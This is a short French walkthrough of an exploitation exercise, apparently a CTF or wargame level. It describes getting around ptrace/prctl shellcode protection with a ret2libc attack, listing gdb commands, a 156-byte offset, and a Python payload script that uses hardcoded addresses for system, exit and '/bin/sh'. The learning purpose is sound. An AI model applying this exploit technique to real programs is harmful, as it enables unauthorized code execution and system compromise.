Dans cet exercice on voit un code qui se protège contre les shellcode grâce à ptrace et prctl nous allons devoir bypasser ces protections 

Pour ce faire il va falloir trouver un moyen d'avoir un shell sans execve
set follow-fork-mode child

156 d'offset on peut faire un ret2libc comme on a pu le faire auparavant

find &system,+9999999,/bin/sh
p system
p exit

# -*- coding: utf-8 -*-
import struct

sys_addr = struct.pack("I",0xf7e6aed0)
bin_sh = struct.pack("I", 0xf7f897ec)
exit_addr = struct.pack("I", 0xf7e5eb70)
payload = "A" * 156 + sys_addr + exit_addr + bin_sh  
print(payload)

